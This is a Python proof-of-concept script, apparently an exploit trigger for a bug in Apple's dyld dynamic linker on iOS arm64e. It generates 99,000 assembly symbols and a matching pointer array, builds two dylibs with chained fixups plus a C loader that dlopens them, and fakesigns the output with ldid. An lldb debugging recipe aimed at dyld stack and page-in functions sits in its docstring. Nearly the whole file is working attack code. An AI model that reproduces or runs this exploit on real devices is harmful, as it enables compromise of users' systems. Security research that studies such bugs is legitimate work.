"""
    b dyld`setUpPageInLinkingRegions
    b dyld`lsl::ProtectedStack::allocateStack
    process attach --name 'pwn' --waitfor
    
    runas
        ./out/pwn
"""

import os

COUNT = 99_000

with open("out/poc.s", "w") as f:
    f.write(".text\n")
    for i in range(COUNT):
        f.write(f".globl _pwn_{i}\n")
        f.write(f"_pwn_{i}: ret\n")

with open("out/vuln.s", "w") as f:
    f.write(".data\n")
    f.write(".align 3\n")
    f.write(".globl _pwn_array\n_pwn_array:\n")
    for i in range(COUNT):
        f.write(f".quad _pwn_{i}\n")

with open("out/pwn.c", "w") as f:
    f.write("#include <dlfcn.h>\n")
    f.write("int main() {\n")

    f.write("    dlopen(\"@executable_path/libvuln.dylib\", 2);\n") 
    f.write("    return 0;\n")
    f.write("}\n")


os.system("xcrun -sdk iphoneos clang -arch arm64e -dynamiclib ./out/poc.s -o out/libpoc.dylib -Wl,-fixup_chains -install_name @executable_path/libpoc.dylib")
os.system("xcrun -sdk iphoneos clang -arch arm64e -dynamiclib ./out/vuln.s -Lout -lpoc -o out/libvuln.dylib -Wl,-fixup_chains -install_name @executable_path/libvuln.dylib")
os.system("xcrun -sdk iphoneos clang -arch arm64e ./out/pwn.c -o out/pwn")
os.system("ldid -S'' out/*.dylib out/pwn")